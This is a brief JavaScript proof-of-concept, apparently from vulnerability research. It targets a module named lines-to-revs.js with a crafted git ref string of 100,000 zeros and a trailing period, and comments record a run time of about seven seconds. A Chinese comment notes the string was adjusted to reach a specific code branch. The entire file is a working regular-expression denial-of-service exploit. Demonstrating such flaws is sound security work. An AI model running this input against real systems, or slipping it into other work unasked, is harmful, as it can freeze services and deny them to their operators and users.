const myFunc = require("./lines-to-revs.js");

//Attack String :""+"0"*100000+"."
var str = "1 refs/tags/";
for (var i = 0; i < 100000; i++) {
  str += "0";
}
str += ".";

const result = myFunc([str]);

// real    0m7.018s
// user    0m6.983s
// sys     0m0.020s

//为进入指定分支,修改了攻击串